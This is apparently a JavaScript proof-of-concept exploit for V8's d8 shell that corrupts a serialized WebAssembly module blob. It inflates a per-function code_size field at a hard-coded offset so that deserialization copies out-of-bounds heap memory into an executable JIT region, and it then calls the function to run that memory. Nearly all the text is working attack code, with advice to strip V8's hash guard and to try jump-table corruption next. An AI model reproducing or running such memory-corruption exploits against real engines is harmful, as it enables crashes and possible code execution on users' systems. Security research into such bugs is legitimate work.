/**
 * wasm_crash_poc.js — in-memory crash via V8 wasm code_size OOB
 *
 * Bug:    wasm-serialization.cc  NativeModuleDeserializer::ReadCode
 *         code_size (uint32) is DCHECK-only bounded, not CHECK.
 *         In release builds the DCHECK is stripped:
 *           reader->ReadVector<uint8_t>(code_size=128MB)  → view past blob end
 *           CopyAndRelocate: memcpy(jit_dest, oob_src, 128MB)
 *           → 128 MB of heap garbage pasted into RWX JIT allocation
 *           → inst.exports.f() executes garbage instructions → SIGILL/SIGSEGV
 *
 * Run:    d8_poc --no-liftoff wasm_crash_poc.js
 *
 * Requirements:
 *   • d8.wasm.serializeModule / d8.wasm.deserializeModule  (d8_poc namespace)
 *   • No --allow-natives-syntax  (no %* syntax used)
 *   • No filesystem access        (pure in-memory, no cache files)
 *   • No file patching            (blob crafted fresh in JS)
 */

'use strict';

// ── Minimal wasm: () -> i32 (i32.const 42) ───────────────────────────────────
const wireBytes = new Uint8Array([
  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,  // \0asm v1
  0x01,0x05,0x01,0x60,0x00,0x01,0x7f,        // type: () -> i32
  0x03,0x02,0x01,0x00,                        // func: type[0]
  0x07,0x05,0x01,0x01,0x66,0x00,0x00,        // export "f" = func[0]
  0x0a,0x06,0x01,0x04,0x00,0x41,0x2a,0x0b,  // body: i32.const 42 end
]);

const hex = n => '0x' + n.toString(16);

print('[*] Compiling minimal wasm module...');
const mod = new WebAssembly.Module(wireBytes);
const inst0 = new WebAssembly.Instance(mod);
print('    f() =', inst0.exports.f(), '(expected 42)');

// ── Serialize in memory — no filesystem, no native syntax ────────────────────
print('\n[*] Serializing module to get valid blob format...');
const blob = new Uint8Array(d8.wasm.serializeModule(mod));
print('    blob size:', blob.length, 'bytes');

// ── Verify known offsets ─────────────────────────────────────────────────────
const dv = new DataView(blob.buffer);

const magic = dv.getUint32(0, true);
print('\n[*] V8 blob structure (confirmed from wasm-serialization.cc):');
print('    [0]  magic            =', hex(magic));

const totalCodeSizeOff = 36;
const codeSizeOff      = 81;

const origTotal = dv.getBigUint64(totalCodeSizeOff, true);
const origCode  = dv.getUint32(codeSizeOff, true);
print('    [36] total_code_size  =', origTotal, '(uint64 LE)');
print('    [44] fn-0 marker      = 0x' + blob[44].toString(16),
      blob[44] === 4 ? '(TurboFan ✓)' : '(unexpected)');
print('    [81] code_size fn-0   =', origCode, '(uint32 LE)');

// ── Craft malicious blob — ONLY patch code_size fn-0, leave total_code_size ──
// WHY: If total_code_size is also inflated to 128MB, V8 allocates a 128MB JIT
// region and the memcpy succeeds without overflowing (no crash).  By keeping
// total_code_size at its original ~320 value, V8 allocates only ~4KB of JIT
// space, so memcpy(jit_4KB, oob_src, 128MB) overflows → SIGSEGV after 4KB.
const GIANT = 0x08000000;  // 128 MB

print('\n[*] Inflating ONLY code_size fn-0 to', hex(GIANT), '(128 MB)...');
print('    total_code_size stays at original value (keeps JIT allocation small)');
dv.setUint32(codeSizeOff, GIANT, true);  // code_size fn-0 only

print('    blob[36..43] (total_code_size, unchanged) =',
  Array.from(blob.slice(36,44)).map(b=>b.toString(16).padStart(2,'0')).join(' '));
print('    blob[81..84] (code_size fn-0, PATCHED) =',
  Array.from(blob.slice(81,85)).map(b=>b.toString(16).padStart(2,'0')).join(' '));

// ── Deserialize — triggers NativeModuleDeserializer::ReadCode ────────────────
print('\n[*] Deserializing crafted blob...');
print('    ReadCode reads: code_size =', hex(GIANT),
      '→ ReadVector<uint8_t>(128MB)');
print('    JIT allocation: ~4KB (from original total_code_size ~' + origTotal + ')');
print('    CopyAndRelocate: memcpy(jit_4KB, oob_src, 128MB)');
print('    → overflows 4KB JIT region after first page → SIGSEGV');

let malMod;
try {
  malMod = d8.wasm.deserializeModule(blob.buffer, wireBytes);
  print('    deserializeModule returned:', malMod);
} catch (e) {
  print('[!] deserializeModule threw:', e.message);
  if (e.message && e.message.toLowerCase().includes('manipulated')) {
    print('    Hash guard active — build d8_poc with the hash guard removed');
  }
  quit(1);
}

// ── Execute garbage JIT code — CRASH ─────────────────────────────────────────
print('\n[*] Instantiating deserialized module...');
const malInst = new WebAssembly.Instance(malMod);

print('[*] Calling f() → executes 128MB of heap garbage as x86 code');
print('    Expected: SIGILL or SIGSEGV — crash on first invalid instruction\n');
const retval = malInst.exports.f();
print('    f() returned:', retval);
if (retval === 42) {
  print('[!] retval == 42 → V8 silently recompiled (hash guard triggered fallback)');
  print('    The corrupted blob was rejected; we are running clean code.');
  print('    Need a different attack vector — trying jump table corruption...');
} else {
  print('[!] retval ≠ 42 → corrupted JIT was used, but no crash');
  print('    Try smaller code_size to overflow into tighter JIT allocation');
}
